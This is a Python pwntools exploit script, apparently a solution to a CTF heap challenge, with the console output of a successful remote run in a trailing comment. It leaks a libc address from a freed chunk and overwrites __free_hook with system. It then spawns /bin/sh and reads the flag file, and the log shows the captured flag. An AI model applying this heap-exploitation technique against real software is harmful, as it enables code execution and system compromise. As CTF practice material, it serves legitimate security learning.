from pwn import *

#context.log_level = 'debug'

BINARY = './just_another_heap'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "dctf-chall-just-another-heap.westeurope.azurecontainer.io"
  PORT = 7481
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
libc = elf.libc

def Create(idx, name, size, offset, data):
  s.sendlineafter("[6] Exit\n", "1")
  s.sendlineafter("write?\n", str(idx))
  s.sendlineafter("name:\n", name)
  s.sendlineafter("memory\n", str(size))
  s.sendlineafter("them.\n", str(offset))
  if size > offset:
    s.sendlineafter("write\n", data)
  s.sendlineafter("[Y/N]\n", "Y")
  s.sendlineafter("[Y/N]\n", "Y")

def Create1(idx, name, size, offset, data):
  s.sendlineafter("[6] Exit\n", "1")
  s.sendlineafter("write?", str(idx))
  s.sendlineafter("name:", name)
  s.sendlineafter("memory\n", str(size))
  s.sendlineafter("them.\n", str(offset))
  s.sendlineafter("write\n", data)
  s.sendlineafter("[Y/N]\n", "Y")
  s.sendlineafter("[Y/N]\n", "Y")

def Relive(idx):
  s.sendlineafter("[6] Exit\n", "2")
  s.sendlineafter("> ", str(idx))

def Forget(idx):
  s.sendlineafter("[6] Exit\n", "3")
  s.sendlineafter("> ", str(idx))

def Change(idx, yesno, data):
  s.sendlineafter("[6] Exit\n", "4")
  s.sendlineafter("> ", str(idx))
  s.sendlineafter("> ", yesno)
  s.sendlineafter("> ", data)

def List():
  s.sendlineafter("[6] Exit\n", "5")

Create(0, "A"*15, 0x438, 0x10, "a")
Create(1, "B"*15, 0x10, 0, "/bin/sh")

# libc leak
Forget(0)

Create(0, "C"*10, 0x8, 8, "c")


Relive(0)
s.recvuntil("_"*8)
r = s.recvuntil("\n")[:-1]
libc_leak = u64(r + "\x00\x00")
libc_base = libc_leak - 0x3ebca0
free_hook = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
print "libc_leak =", hex(libc_leak)
print "libc_base =", hex(libc_base)
print "free_hook =", hex(free_hook)

Create1(2, "E"*10, -10, free_hook-0x10000000000000000, p64(system_addr))

# start /bin/sh
Forget(1)

s.sendline("cat flag.txt")

s.interactive()

'''
mito@ubuntu:~/CTF/DCTF_2021/Pwn_Just_another_heap_400$ python solve.py r
[*] '/home/mito/CTF/DCTF_2021/Pwn_Just_another_heap_400/just_another_heap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
[+] Opening connection to dctf-chall-just-another-heap.westeurope.azurecontainer.io on port 7481: Done
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7f3d9fd4eca0
libc_base = 0x7f3d9f963000
free_hook = 0x7f3d9fd508e8
[*] Switching to interactive mode
Which memory would you like to forget?
> dctf{I_h4V3_0_id3a_h0W_y0u_G0T_h3r3}
'''

